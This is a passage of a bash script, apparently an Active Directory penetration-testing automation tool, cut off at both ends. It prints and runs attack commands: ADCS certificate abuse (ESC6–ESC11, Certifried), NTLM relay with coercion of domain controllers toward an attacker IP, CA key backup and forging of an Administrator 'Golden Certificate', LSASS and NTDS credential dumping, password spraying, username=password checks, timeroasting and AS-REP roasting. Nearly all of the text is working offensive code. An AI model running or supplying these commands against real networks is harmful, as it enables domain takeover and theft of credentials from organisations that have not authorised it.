Name\"' \"${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json\" 2>/dev/null | sort -u)\n    if [[ -n $esc6_vuln ]]; then\n        echo -e \"${GREEN}[+] ESC6 vulnerability potentially found! Follow steps below for exploitation:${NC}\"\n        for vulnca in $esc6_vuln; do\n            echo -e \"${YELLOW}# ${vulnca} certificate authority${NC}\"\n            echo -e \"${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}\"\n            echo -e \"${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -template User -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}2. Authenticate using pfx of domain_admin:${NC}\"\n            echo -e \"${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}\"\n        done\n    fi\n\n    esc7_vuln=$(/usr/bin/jq -r '.\"Certificate Authorities\"[] | select (.\"[!] Vulnerabilities\".\"ESC7\") | .\"CA Name\"' \"${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json\" 2>/dev/null | sort -u)\n    if [[ -n $esc7_vuln ]]; then\n        echo -e \"${GREEN}[+] ESC7 vulnerability potentially found! Follow steps below for exploitation:${NC}\"\n        for vulnca in $esc7_vuln; do\n            echo -e \"${YELLOW}# ${vulnca} certificate authority${NC}\"\n            echo -e \"${CYAN}1. Add a new officer:${NC}\"\n            echo -e \"${certipy} ca ${argument_certipy} -ca $vulnca -add-officer '${user}' -dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}2. Enable SubCA certificate template:${NC}\"\n            echo -e \"${certipy} ca ${argument_certipy} -ca $vulnca -enable-template SubCA -dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}3. Save the private key and note down the request ID:${NC}\"\n            echo -e \"${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -template SubCA -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}4. Issue a failed request (need ManageCA and ManageCertificates rights for a failed request):${NC}\"\n            echo -e \"${certipy} ca ${argument_certipy} -ca $vulnca -issue-request <request_ID> -dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}5. Retrieve an issued certificate:${NC}\"\n            echo -e \"${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -retrieve <request_ID> -dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}6. Authenticate using pfx of domain_admin:${NC}\"\n            echo -e \"${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}\"\n        done\n    fi\n\n    esc8_vuln=$(/usr/bin/jq -r '.\"Certificate Authorities\"[] | select (.\"[!] Vulnerabilities\".\"ESC8\") | .\"CA Name\"' \"${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json\" 2>/dev/null | sort -u)\n    if [[ -n $esc8_vuln ]]; then\n        echo -e \"${GREEN}[+] ESC8 vulnerability potentially found! Follow steps below for exploitation:${NC}\"\n        for vulnca in $esc8_vuln; do\n            echo -e \"${YELLOW}# ${vulnca} certificate authority${NC}\"\n            echo -e \"${CYAN}1. Start the relay server:${NC}\"\n            echo -e \"${certipy} relay -target http://< ${pki_servers} > -ca ${vulnca} -template DomainController \"\n            echo -e \"${CYAN}2. Coerce Domain Controller:${NC}\"\n            echo -e \"${coercer} coerce ${argument_coercer} -t ${dc_ip} -l < attacker_IP $attacker_IP > --dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}3. Authenticate using pfx of Domain Controller:${NC}\"\n            echo -e \"${certipy} auth -pfx ${dc_NETBIOS}.pfx -dc-ip ${dc_ip}\"\n        done\n    fi\n\n    esc9_vuln=$(/usr/bin/jq -r '.\"Certificate Templates\"[] | select (.\"[!] Vulnerabilities\".\"ESC9\" and (.\"[!] Vulnerabilities\"[] | contains(\"Admins\") | not) and .\"Enabled\" == true).\"Template Name\"' \"${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json\" 2>/dev/null | sort -u)\n    if [[ -n $esc9_vuln ]]; then\n        echo -e \"${GREEN}[+] ESC9 vulnerability potentially found! Follow steps below for exploitation:${NC}\"\n        for vulntemp in $esc9_vuln; do\n            echo -e \"${YELLOW}# ${vulntemp} certificate template${NC}\"\n            echo -e \"${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}\"\n            echo -e \"${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}2. Change userPrincipalName of second_user to domain_admin:${NC}\"\n            echo -e \"${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}3. Request vulnerable certificate as second_user:${NC}\"\n            echo -e \"${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -target < ${pki_servers} > -ca < ${pki_cas//SPACE/ } > -template ${vulntemp} -dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}4. Change second_user's UPN back:${NC}\"\n            echo -e \"${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}5. Authenticate using pfx of domain_admin:${NC}\"\n            echo -e \"${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}\"\n        done\n    fi\n\n    esc10_vuln=$(/usr/bin/jq -r '.\"Certificate Authorities\"[] | select (.\"[!] Vulnerabilities\".\"ESC10\") | .\"CA Name\"' \"${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json\" 2>/dev/null | sort -u)\n    if [[ -n $esc10_vuln ]]; then\n        echo -e \"${GREEN}[+] ESC10 vulnerability potentially found! Follow steps below for exploitation:${NC}\"\n        for vulnca in $esc10_vuln; do\n            echo -e \"${YELLOW}# ${vulnca} certificate authority${NC}\"\n            echo -e \"${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}\"\n            echo -e \"${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}2. Change userPrincipalName of user2 to domain_admin or DC:${NC}\"\n            echo -e \"${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}\"\n            echo -e \"${certipy} account update ${argument_certipy} -user <second_user> -upn ${dc_NETBIOS}\\\\\\$@${dc_domain} -dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}3. Request certificate permitting client authentication as second_user:${NC}\"\n            echo -e \"${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -ca $vulnca -template User -dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}4. Change second_user's UPN back:${NC}\"\n            echo -e \"${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip}\"\n            echo -e \"${CYAN}5. Authenticate using pfx of domain_admin or DC:${NC}\"\n            echo -e \"${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}\"\n            echo -e \"${certipy} auth -pfx ${dc_NETBIOS}.pfx -dc-ip ${dc_ip}\"g\n        done\n    fi\n\n    esc11_vuln=$(/usr/bin/jq -r '.\"Certificate Authorities\"[] | select (.\"[!] Vulnerabilities\".\"ESC11\") | .\"CA Name\"' \"${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json\" 2>/dev/null | sort -u)\n    if [[ -n $esc11_vuln ]]; then\n        echo -e \"${GREEN}[+] ESC11 vulnerability potentially found! Follow steps below for exploitation:${NC}\"\n        for vulnca in $esc11_vuln; do\n            echo -e \"${YELLOW}# ${vulnca} certificate authority${NC}\"\n            echo -e \"${CYAN}1. Start the relay server (relay to the Certificate Authority and request certificate via ICPR):${NC}\"\n            echo -e \"ntlmrelayx.py -t rpc://< ${pki_servers} > -rpc-mode ICPR -icpr-ca-name $vulnca -smb2support\"\n            echo -e \"OR\"\n            echo -e \"${certipy} relay -target rpc://< ${pki_servers} > -ca ${vulnca}\"\n            echo -e \"${CYAN}2. Coerce Domain Controller:${NC}\"\n            echo -e \"${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip\"\n        done\n    fi\n}\n\ncertifried_check() {\n    if [[ ! -f \"${certipy}\" ]]; then\n        echo -e \"${RED}[-] Please verify the installation of certipy${NC}\"\n    else\n        echo -e \"${BLUE}[*] Certifried Vulnerability Check${NC}\"\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] certipy requires credentials${NC}\"\n        else\n            ne_adcs_enum\n            current_dir=$(pwd)\n            cd \"${output_dir}/Credentials\" || exit\n            i=0\n            for pki_server in $pki_servers; do\n                i=$((i + 1))\n                pki_ca=$(echo -e \"$pki_cas\" | sed 's/ /\\n/g' | sed -n ${i}p)\n                if [ \"${ldapbinding_bool}\" == true ]; then ldapbinding_param=\"-ldap-channel-binding\"; else ldapbinding_param=\"\"; fi\n                run_command \"${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldapbinding_param} -target ${pki_server} -ca \\\"${pki_ca//SPACE/ }\\\" -template User\" 2>&1 | tee \"${output_dir}/ADCS/certifried_check_${pki_server}_${dc_domain}.txt\"\n                if ! grep -q \"Certificate object SID is\" \"${output_dir}/ADCS/certifried_check_${pki_server}_${dc_domain}.txt\" && ! grep -q \"error\" \"${output_dir}/ADCS/certifried_check_${pki_server}_${dc_domain}.txt\"; then\n                    echo -e \"${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}\" | tee -a \"${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt\"\n                    echo -e \"${CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:${NC}\" | tee -a \"${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt\"\n                    echo -e \"${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain\" | tee -a \"${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt\"\n                    echo -e \"${CYAN}2. Obtain a certificate for the new computer:${NC}\" | tee -a \"${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt\"\n                    echo -e \"${certipy} req -u NEW_COMPUTER_NAME\\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca \\\"${pki_ca//SPACE/ }\\\" -template Machine\" | tee -a \"${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt\"\n                    echo -e \"${CYAN}3. Authenticate using pfx:${NC}\" | tee -a \"${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt\"\n                    echo -e \"${certipy} auth -pfx ${dc_NETBIOS}.pfx -username ${dc_NETBIOS}\\$ -dc-ip ${dc_ip}\" | tee -a \"${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt\"\n                    echo -e \"${CYAN}4. Delete the created computer:${NC}\" | tee -a \"${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt\"\n                    echo -e \"${certipy} account delete ${argument_certipy} -dc-ip ${dc_ip} -user NEW_COMPUTER_NAME \" | tee -a \"${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt\"\n                fi\n            done\n            cd \"${current_dir}\" || exit\n        fi\n    fi\n    echo -e \"\"\n}\n\ncertipy_ldapshell() {\n    if [[ ! -f \"${certipy}\" ]]; then\n        echo -e \"${RED}[-] Please verify the installation of certipy${NC}\"\n    else\n        if [ \"${cert_bool}\" == true ]; then\n            echo -e \"${BLUE}[*] Launching LDAP shell via Schannel using Certipy ${NC}\"\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"\"; else ldaps_param=\"-ldap-scheme ldap\"; fi\n            run_command \"${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -ldap-shell\" 2>&1 | tee \"${output_dir}/ADCS/certipy_ldapshell_output_${dc_domain}.txt\"\n        else\n            echo -e \"${PURPLE}[-] Certificate authentication required to open LDAP shell using Certipy${NC}\"\n        fi\n    fi\n    echo -e \"\"\n}\n\ncertipy_ca_dump() {\n    if [[ ! -f \"${certipy}\" ]]; then\n        echo -e \"${RED}[-] Please verify the installation of certipy${NC}\"\n    else\n        echo -e \"${BLUE}[*] Certipy extract CAs and forge Golden Certificate${NC}\"\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] certipy requires credentials${NC}\"\n        else\n            ne_adcs_enum\n            domain_DN=$(fqdn_to_ldap_dn \"${dc_domain}\")\n            current_dir=$(pwd)\n            cd \"${output_dir}/Credentials\" || exit\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"\"; else ldaps_param=\"-scheme ldap\"; fi\n            i=0\n            for pki_server in $pki_servers; do\n                i=$((i + 1))\n                pki_ca=$(echo -e \"$pki_cas\" | sed 's/ /\\n/g' | sed -n ${i}p)\n                run_command \"${certipy} ca ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -target ${pki_server} -backup\" | tee -a \"${output_dir}/ADCS/certipy_ca_backup_output_${dc_domain}.txt\"\n                run_command \"${certipy} forge -ca-pfx ${output_dir}/Credentials/${pki_ca//SPACE/_}.pfx -upn Administrator@${dc_domain} -subject CN=Administrator,CN=Users,$domain_DN -out Administrator_${pki_ca//SPACE/_}_${dc_domain}.pfx\" | tee -a \"${output_dir}/ADCS/certipy_forge_output_${dc_domain}.txt\"\n                if [[ -f \"${output_dir}/Credentials/Administrator_${pki_ca//SPACE/_}_${dc_domain}.pfx\" ]]; then\n                    echo -e \"${GREEN}[+] Golden Certificate successfully generated!${NC}\"\n                    echo -e \"${CYAN}Authenticate using pfx of Administrator:${NC}\"\n                    echo -e \"${certipy} auth -pfx ${output_dir}/Credentials/Administrator_${pki_ca//SPACE/_}_${dc_domain}.pfx -dc-ip ${dc_ip} [-ldap-shell]\"\n                fi\n            done\n            cd \"${current_dir}\" || exit\n        fi\n    fi\n    echo -e \"\"\n}\n\nmasky_dump() {\n    echo -e \"${BLUE}[*] Dumping LSASS using masky (ADCS required)${NC}\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] LSASS dump requires credentials${NC}\"\n    else\n        ne_adcs_enum\n        if [ ! \"${pki_servers}\" == \"\" ] && [ ! \"${pki_cas}\" == \"\" ]; then\n            if [ \"${kerb_bool}\" == true ]; then\n                echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n                curr_targets=\"Domain Controllers\"\n            fi\n            smb_scan\n            i=0\n            for pki_server in $pki_servers; do\n                i=$((i + 1))\n                pki_ca=$(echo -e \"$pki_cas\" | sed 's/ /\\n/g' | sed -n ${i}p)\n                for i in $(/bin/cat \"${servers_smb_list}\"); do\n                    echo -e \"${CYAN}[*] LSASS dump of ${i} using masky (PKINIT)${NC}\"\n                    run_command \"${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M masky -o \\\"CA=${pki_server}\\\\${pki_ca//SPACE/ }\\\" --log ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${i}.txt\" 2>&1\n                done\n            done\n        else\n            echo -e \"${PURPLE}[-] No ADCS servers found! Please re-run ADCS enumeration and try again..${NC}\"\n        fi\n    fi\n    echo -e \"\"\n}\n\ncertsync_ntds_dump() {\n    if [ ! -f \"${certsync}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of certsync${NC}\"\n    else\n        echo -e \"${BLUE}[*] Dumping NTDS using certsync${NC}\"\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] certsync requires credentials${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"\"; else ldaps_param=\"-scheme ldap\"; fi\n            run_command \"${certsync} ${argument_certsync} -dc-ip ${dc_ip} -dns-tcp -ns ${dc_ip} ${ldaps_param} -kdcHost ${dc_FQDN} -outputfile ${output_dir}/Credentials/certsync_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\n###### bruteforce: Brute Force attacks\nridbrute_attack() {\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${BLUE}[*] RID Brute Force (Null session)${NC}\"\n        run_command \"${netexec} ${ne_verbose} smb ${target} ${argument_ne} --rid-brute --log ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt\"\n        run_command \"${netexec} ${ne_verbose} smb ${target} -u Guest -p '' --rid-brute --log ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt\"\n        run_command \"${netexec} ${ne_verbose} smb ${target} -u ${rand_user} -p '' --rid-brute --log ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt\"\n        #Parsing user lists\n        grep \"SidTypeUser\" \"${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt\" | cut -d \"\\\\\" -f 2 | sort -u | sed \"s/ (SidTypeUser)//g\" >\"${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt\" 2>&1\n        parse_users\n    else\n        echo -e \"${PURPLE}[-] Null session RID brute force skipped (credentials provided)${NC}\"\n    fi\n    echo -e \"\"\n}\n\nkerbrute_enum() {\n    if [ \"${nullsess_bool}\" == true ]; then\n        if [ ! -f \"${kerbrute}\" ]; then\n            echo -e \"${RED}[-] Please verify the location of kerbrute${NC}\"\n        else\n            echo -e \"${BLUE}[*] kerbrute User Enumeration (Null session)${NC}\"\n            echo -e \"${YELLOW}[i] Using $user_wordlist wordlist for user enumeration. This may take a while...${NC}\"\n            run_command \"${kerbrute} userenum ${user_wordlist} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}\" >>\"${output_dir}/BruteForce/kerbrute_user_output_${dc_domain}.txt\"\n            grep \"VALID\" \"${output_dir}/BruteForce/kerbrute_user_output_${dc_domain}.txt\" | cut -d \" \" -f 8 | cut -d \"@\" -f 1 >\"${output_dir}/DomainRecon/Users/users_list_kerbrute_${dc_domain}.txt\" 2>&1\n            if [ -s \"${output_dir}/DomainRecon/Users/users_list_kerbrute_${dc_domain}.txt\" ]; then\n                echo -e \"${GREEN}[+] Printing valid accounts...${NC}\"\n                /bin/cat \"${output_dir}/DomainRecon/Users/users_list_kerbrute_${dc_domain}.txt\" 2>/dev/null\n                parse_users\n            fi\n        fi\n    else\n        echo -e \"${PURPLE}[-] Kerbrute null session enumeration skipped (credentials provided)${NC}\"\n    fi\n    echo -e \"\"\n}\n\nuserpass_ne_check() {\n    target_userslist=\"${users_list}\"\n    if [ ! -s \"${users_list}\" ]; then\n        userslist_ans=\"N\"\n        echo -e \"${PURPLE}[!] No known users found. Would you like to use custom wordlist instead (y/N)?${NC}\"\n        read -rp \">> \" userslist_ans </dev/tty\n        if [[ \"${userslist_ans}\" == \"y\" ]] || [[ \"${userslist_ans}\" == \"Y\" ]]; then\n            target_userslist=\"${user_wordlist}\"\n        fi\n    fi\n    echo -e \"${BLUE}[*] netexec User=Pass Check (Noisy!)${NC}\"\n    echo -e \"${YELLOW}[i] Finding users with Password = username using netexec. This may take a while...${NC}\"\n    run_command \"${netexec} ${ne_verbose} smb ${target} -u ${target_userslist} -p ${target_userslist} --no-bruteforce --continue-on-success\" | tee \"${output_dir}/BruteForce/ne_userpass_output_${dc_domain}.txt\"\n    grep \"\\[+\\]\" \"${output_dir}/BruteForce/ne_userpass_output_${dc_domain}.txt\" | cut -d \"\\\\\" -f 2 | cut -d \" \" -f 1 >\"${output_dir}/BruteForce/user_eq_pass_valid_ne_${dc_domain}.txt\"\n    if [ -s \"${output_dir}/BruteForce/user_eq_pass_valid_ne_${dc_domain}.txt\" ]; then\n        echo -e \"${GREEN}[+] Printing accounts with username=password...${NC}\"\n        /bin/cat \"${output_dir}/BruteForce/user_eq_pass_valid_ne_${dc_domain}.txt\" 2>/dev/null\n    else\n        echo -e \"${PURPLE}[-] No accounts with username=password found${NC}\"\n    fi\n    echo -e \"\"\n}\n\nuserpass_kerbrute_check() {\n    if [ ! -f \"${kerbrute}\" ]; then\n        echo -e \"${RED}[-] Please verify the location of kerbrute${NC}\"\n    else\n        target_userslist=\"${users_list}\"\n        user_pass_wordlist=\"${output_dir}/BruteForce/kerbrute_userpass_wordlist_${dc_domain}.txt\"\n        echo -e \"${BLUE}[*] kerbrute User=Pass Check (Noisy!)${NC}\"\n        if [ ! -s \"${users_list}\" ]; then\n            userslist_ans=\"N\"\n            echo -e \"${PURPLE}[!] No known users found. Would you like to use custom wordlist instead (y/N)?${NC}\"\n            read -rp \">> \" userslist_ans </dev/tty\n            if [[ \"${userslist_ans}\" == \"y\" ]] || [[ \"${userslist_ans}\" == \"Y\" ]]; then\n                target_userslist=\"${user_wordlist}\"\n            fi\n        fi\n        echo -e \"${YELLOW}[i] Finding users with Password = username using kerbrute. This may take a while...${NC}\"\n        /bin/rm \"${user_pass_wordlist}\" 2>/dev/null\n        while IFS= read -r i; do\n            echo -e \"${i}:${i}\" >>\"${user_pass_wordlist}\"\n        done <\"${target_userslist}\"\n        sort -uf \"${user_pass_wordlist}\" -o \"${user_pass_wordlist}\"\n        run_command \"${kerbrute} bruteforce ${user_pass_wordlist} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}\" | tee \"${output_dir}/BruteForce/kerbrute_pass_output_${dc_domain}.txt\"\n        grep \"VALID\" \"${output_dir}/BruteForce/kerbrute_pass_output_${dc_domain}.txt\" | cut -d \" \" -f 8 | cut -d \"@\" -f 1 >\"${output_dir}/BruteForce/user_eq_pass_valid_kerb_${dc_domain}.txt\"\n        if [ -s \"${output_dir}/BruteForce/user_eq_pass_valid_kerb_${dc_domain}.txt\" ]; then\n            echo -e \"${GREEN}[+] Printing accounts with username=password...${NC}\"\n            /bin/cat \"${output_dir}/BruteForce/user_eq_pass_valid_kerb_${dc_domain}.txt\" 2>/dev/null\n        else\n            echo -e \"${PURPLE}[-] No accounts with username=password found${NC}\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nne_passpray() {\n    target_userslist=\"${users_list}\"\n    if [ ! -s \"${users_list}\" ]; then\n        userslist_ans=\"N\"\n        echo -e \"${PURPLE}[!] No known users found. Would you like to use custom wordlist instead (y/N)?${NC}\"\n        read -rp \">> \" userslist_ans </dev/tty\n        if [[ \"${userslist_ans}\" == \"y\" ]] || [[ \"${userslist_ans}\" == \"Y\" ]]; then\n            target_userslist=\"${user_wordlist}\"\n        fi\n    fi\n    echo -e \"${BLUE}[*] Password spray using netexec (Noisy!)${NC}\"\n    echo -e \"${BLUE}[*] Please specify password for password spray:${NC}\"\n    read -rp \">> \" passpray_password </dev/tty\n    while [ \"${passpray_password}\" == \"\" ]; do\n        echo -e \"${RED}Invalid password.${NC} Please specify password:\"\n        read -rp \">> \" passpray_password </dev/tty\n    done\n    echo -e \"${YELLOW}[i] Password spraying with password ${passpray_password}. This may take a while...${NC}\"\n    run_command \"${netexec} ${ne_verbose} ldap ${target_dc} -u ${target_userslist} -p ${passpray_password} --no-bruteforce --continue-on-success --log ${output_dir}/BruteForce/ne_passpray_output_${dc_domain}.txt\" 2>&1\n    grep \"\\[+\\]\" \"${output_dir}/BruteForce/ne_passpray_output_${dc_domain}.txt\" | cut -d \"\\\\\" -f 2 | cut -d \" \" -f 1 >\"${output_dir}/BruteForce/passpray_valid_ne_${dc_domain}.txt\"\n    if [ -s \"${output_dir}/BruteForce/passpray_valid_ne_${dc_domain}.txt\" ]; then\n        echo -e \"${GREEN}[+] Printing accounts with password ${passpray_password}...${NC}\"\n        /bin/cat \"${output_dir}/BruteForce/passpray_valid_ne_${dc_domain}.txt\" 2>/dev/null\n    else\n        echo -e \"${PURPLE}[-] No accounts with password ${passpray_password} found${NC}\"\n    fi\n    echo -e \"\"\n}\n\nkerbrute_passpray() {\n    if [ ! -f \"${kerbrute}\" ]; then\n        echo -e \"${RED}[-] Please verify the location of kerbrute${NC}\"\n    else\n        target_userslist=\"${users_list}\"\n        if [ ! -s \"${users_list}\" ]; then\n            userslist_ans=\"N\"\n            echo -e \"${PURPLE}[!] No known users found. Would you like to use custom wordlist instead (y/N)?${NC}\"\n            read -rp \">> \" userslist_ans </dev/tty\n            if [[ \"${userslist_ans}\" == \"y\" ]] || [[ \"${userslist_ans}\" == \"Y\" ]]; then\n                target_userslist=\"${user_wordlist}\"\n            fi\n        fi\n        echo -e \"${BLUE}[*] Password spray using kerbrute (Noisy!)${NC}\"\n        echo -e \"${BLUE}[*] Please specify password for password spray:${NC}\"\n        read -rp \">> \" passpray_password </dev/tty\n        while [ \"${passpray_password}\" == \"\" ]; do\n            echo -e \"${RED}Invalid password.${NC} Please specify password:\"\n            read -rp \">> \" passpray_password </dev/tty\n        done\n        echo -e \"${YELLOW}[i] Password spraying with password ${passpray_password}. This may take a while...${NC}\"\n        run_command \"${kerbrute} passwordspray ${target_userslist} ${passpray_password} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}\" | tee \"${output_dir}/BruteForce/kerbrute_passpray_output_${dc_domain}.txt\"\n        grep \"VALID\" \"${output_dir}/BruteForce/kerbrute_passpray_output_${dc_domain}.txt\" | cut -d \" \" -f 8 | cut -d \"@\" -f 1 >\"${output_dir}/BruteForce/passpray_valid_kerb_${dc_domain}.txt\"\n        if [ -s \"${output_dir}/BruteForce/passpray_valid_kerb_${dc_domain}.txt\" ]; then\n            echo -e \"${GREEN}[+] Printing accounts with password ${passpray_password}...${NC}\"\n            /bin/cat \"${output_dir}/BruteForce/passpray_valid_kerb_${dc_domain}.txt\" 2>/dev/null\n        else\n            echo -e \"${PURPLE}[-] No accounts with password ${passpray_password} found${NC}\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nne_pre2k() {\n    echo -e \"${BLUE}[*] Pre2k Enumeration using netexec${NC}\"\n    run_command \"echo -n Y | ${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} -M pre2k --log ${output_dir}/BruteForce/ne_pre2k_output_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n}\n\npre2k_check() {\n    if [ ! -f \"${pre2k}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of pre2k${NC}\"\n    else\n        echo -e \"${BLUE}[*] Pre2k authentication check (Noisy!)${NC}\"\n        pre2k_outputfile=\"${output_dir}/BruteForce/pre2k_outputfile_${dc_domain}.txt\"\n        if [ \"${nullsess_bool}\" == true ]; then\n            if [ ! -s \"${servers_hostname_list}\" ]; then\n                echo -e \"${PURPLE}[-] No computers found! Please re-run computers enumeration and try again..${NC}\"\n            else\n                run_command \"${pre2k} unauth ${argument_pre2k} -dc-ip ${dc_ip} -inputfile ${servers_hostname_list} -outputfile ${pre2k_outputfile}\" | tee \"${output_dir}/BruteForce/pre2k_output_${dc_domain}.txt\"\n            fi\n        else\n            if [ \"${ldapbinding_bool}\" == true ]; then ldapbinding_param=\"-binding\"; else ldapbinding_param=\"\"; fi\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-ldaps ${ldapbinding_param}\"; else ldaps_param=\"\"; fi\n            run_command \"${pre2k} auth ${argument_pre2k} -dc-ip ${dc_ip} -outputfile ${pre2k_outputfile} ${ldaps_param}\" | tee \"${output_dir}/BruteForce/pre2k_output_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nldapnomnom_enum() {\n    if [ \"${nullsess_bool}\" == true ]; then\n        if [ ! -f \"${ldapnomnom}\" ]; then\n            echo -e \"${RED}[-] Please verify the location of ldapnomnom${NC}\"\n        else\n            echo -e \"${BLUE}[*] ldapnomnom User Enumeration (Null session)${NC}\"\n            echo -e \"${YELLOW}[i] Using $user_wordlist wordlist for user enumeration. This may take a while...${NC}\"\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"--tlsmode tls --port 636\"; else ldaps_param=\"\"; fi\n            run_command \"${ldapnomnom} --server ${dc_ip} --dnsdomain ${dc_domain} ${ldaps_param} --maxservers 4 --parallel 8 --input ${user_wordlist} --output ${output_dir}/DomainRecon/Users/users_list_ldapnomnom_${dc_domain}.txt\" | tee -a \"${output_dir}/BruteForce/ldapnomnom_user_output_${dc_domain}.txt\"\n            if [ -s \"${output_dir}/DomainRecon/Users/users_list_ldapnomnom_${dc_domain}.txt\" ]; then\n                echo -e \"\"\n                echo -e \"${GREEN}[+] Printing valid accounts...${NC}\"\n                sort -uf \"${output_dir}/DomainRecon/Users/users_list_ldapnomnom_${dc_domain}.txt\" 2>/dev/null\n                parse_users\n            fi\n        fi\n    else\n        echo -e \"${PURPLE}[-] ldapnomnom null session enumeration skipped (credentials provided)${NC}\"\n    fi\n    echo -e \"\"\n}\n\nne_timeroast() {\n    echo -e \"${BLUE}[*] Timeroast attack (NTP)${NC}\"\n    run_command \"${netexec} ${ne_verbose} smb ${target} ${argument_ne} -M timeroast --log ${output_dir}/BruteForce/ne_timeroast_${dc_domain}.txt\"\n    echo -e \"\"\n}\n\n###### kerberos: Kerberos attacks\nasrep_attack() {\n    if [ ! -f \"${impacket_GetNPUsers}\" ]; then\n        echo -e \"${RED}[-] GetNPUsers.py not found! Please verify the installation of impacket${NC}\"\n    else\n        echo -e \"${BLUE}[*] AS REP Roasting Attack${NC}\"\n        if [[ \"${dc_domain,,}\" != \"${domain,,}\" ]] || [ \"${nullsess_bool}\" == true ]; then\n            if [ -s \"${users_list}\" ]; then\n                users_scan_list=${users_list}\n            else\n                echo -e \"${YELLOW}[i] No credentials for target domain provided. Using $user_wordlist wordlist...${NC}\"\n                users_scan_list=${user_wordlist}\n            fi\n            run_command \"${impacket_GetNPUsers} ${dc_domain}/ -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}\" 